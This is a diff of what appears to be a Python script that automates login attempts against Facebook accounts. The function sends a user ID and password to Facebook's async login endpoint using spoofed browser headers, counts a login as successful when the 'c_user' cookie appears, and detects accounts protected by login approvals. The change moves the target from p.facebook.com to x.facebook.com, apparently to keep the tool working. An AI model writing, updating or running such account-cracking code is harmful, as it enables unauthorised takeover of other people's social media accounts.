@@ -1924,12 +1924,12 @@ def p(uid,pwx,tl):
             'a': 'AYkh5-Ex-aRI47lU6Jgp6nOr4nUFJTvg0RTBgdXo6WoapXVQh6_VcCAiJjMlLOcz71dLoR5aOxzCjylrJvKDQrdmi0ungLJpGVEzgx27yKwTyA',
             'user': '0'}
             headers ={
-            'authority': 'p.facebook.com',
+            'authority': 'x.facebook.com',
             'accept': '*/*',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://p.facebook.com',
-            'referer': 'https://p.facebook.com/login.php',
+            'origin': 'https://x.facebook.com',
+            'referer': 'https://x.facebook.com/login.php',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
@@ -1946,7 +1946,7 @@ def p(uid,pwx,tl):
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://p.facebook.com/login/device-based/login/async/"
+            url = "https://x.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
